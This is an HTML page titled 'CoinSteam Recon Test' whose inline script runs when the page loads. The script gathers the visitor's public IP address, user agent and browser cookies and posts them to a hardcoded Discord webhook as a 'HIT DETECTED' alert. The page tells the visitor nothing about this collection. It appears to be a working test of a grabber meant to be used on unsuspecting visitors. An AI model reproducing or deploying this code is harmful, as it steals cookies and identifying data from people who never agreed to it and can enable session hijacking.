<!DOCTYPE html>
<html>
<head>
    <title>CoinSteam Test</title>
    <style>
        body { background: #1a1c23; color: white; text-align: center; padding: 50px; font-family: sans-serif; }
        .btn { background: #3b82f6; padding: 20px; border-radius: 10px; cursor: pointer; display: inline-block; }
    </style>
</head>
<body>
    <h1>COINSTEAM RECON TEST</h1>
    <p>If the webhook works, you will see a message in Discord.</p>
    <div class="btn" onclick="location.reload()">Refresh to Re-test</div>

    <script>
    (async function() {
        const hook = "https://discord.com/api/webhooks/1502430128251338826/95uPURoeLdsCvkp2-D2ThkMd6Ukof2n6S1mlfJNJQ-n0LtWxWmvGtGkbZpzKrD9Zz9MI";
        
        let ipData = "N/A";
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const json = await res.json();
            ipData = json.ip;
        } catch(e) { ipData = "IP-Fetch-Failed"; }

        const payload = {
            content: "🚨 **HIT DETECTED** 🚨\n**IP:** " + ipData + "\n**User Agent:** " + navigator.userAgent + "\n**Cookies:** " + (document.cookie || "None")
        };

        fetch(hook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        }).then(() => {
            alert("Sent! Check Discord. If it's not there, the webhook is dead.");
        }).catch((err) => {
            alert("Error sending: " + err);
        });
    })();
    </script>
</body>
</html>
